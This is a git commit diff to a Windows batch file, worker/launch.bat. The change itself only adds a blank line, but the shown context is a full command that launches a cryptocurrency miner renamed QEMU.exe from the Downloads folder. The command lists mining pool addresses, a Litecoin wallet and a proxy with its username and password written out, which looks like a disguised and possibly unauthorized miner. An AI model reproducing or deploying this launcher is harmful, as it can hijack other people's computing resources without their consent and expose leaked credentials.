a118d9dc86619a47e7473ec3cb0647d68b35b1ac
dediminari <101470275+dediminari@users.noreply.github.com>
2025-06-23 01:15:41 +0700

    Update launch.bat

--- worker/launch.bat
+++ worker/launch.bat
@@ -15,3 +15,4 @@ cls
 C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowerr16 --pool 103.249.70.7:6534,149.56.111.148:6534,51.79.251.11:6534,141.95.55.97:6534 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy yzgisgem:0p6of1f1pg73@198.23.239.134:6540
 pause
 
+
